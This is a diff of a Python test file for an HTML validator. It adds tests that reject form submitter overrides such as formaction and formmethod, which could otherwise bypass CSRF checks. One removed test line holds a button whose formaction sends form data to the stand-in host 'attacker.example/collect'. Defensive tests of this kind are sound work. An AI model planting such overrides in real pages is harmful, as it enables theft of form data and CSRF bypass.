@@ -160,23 +160,50 @@ def test_base_element_is_rejected() -> None:
             assertion(document)
 
 
-def test_external_formaction_is_rejected() -> None:
+@pytest.mark.parametrize(
+    ("attribute", "value"),
+    [
+        ("formaction", "/admin/alternate"),
+        ("formmethod", "post"),
+        ("formenctype", "application/x-www-form-urlencoded"),
+        ("formtarget", "_self"),
+        ("formnovalidate", "formnovalidate"),
+    ],
+)
+def test_submitter_form_overrides_are_rejected(attribute: str, value: str) -> None:
     document = _document_with_form(action="/admin/mutate", csrf=True).replace(
         "</form>",
-        '<button type="submit" formaction="//attacker.example/collect">Submit</button></form>',
+        f'<button type="submit" {attribute}="{value}">Submit</button></form>',
     )
 
-    with pytest.raises(AssertionError, match="formaction must remain same-origin"):
+    with pytest.raises(AssertionError, match=f"{attribute} is not allowed"):
         assert_valid_document_html(document)
 
 
-def test_local_formaction_remains_valid() -> None:
-    document = _document_with_form(action="/admin/mutate", csrf=True).replace(
+def test_formaction_cannot_escape_login_csrf_exemption() -> None:
+    document = _document_with_form(action="/admin/login").replace(
         "</form>",
-        '<button type="submit" formaction="/admin/alternate">Submit</button></form>',
+        '<button type="submit" formaction="/admin/arbitrary">Submit</button></form>',
     )
 
-    assert_valid_document_html(document)
+    with pytest.raises(AssertionError, match="formaction is not allowed"):
+        assert_valid_document_html(
+            document,
+            csrf_exempt_post_actions=_LOGIN_CSRF_EXEMPT_ACTIONS,
+        )
+
+
+def test_formmethod_cannot_create_unchecked_post() -> None:
+    document = _document_with_form(action="/admin/arbitrary").replace(
+        'method="post"',
+        'method="get"',
+    ).replace(
+        "</form>",
+        '<button type="submit" formmethod="post">Submit</button></form>',
+    )
+
+    with pytest.raises(AssertionError, match="formmethod is not allowed"):
+        assert_valid_document_html(document)
 
 
 def test_post_with_csrf_remains_valid_by_default() -> None:
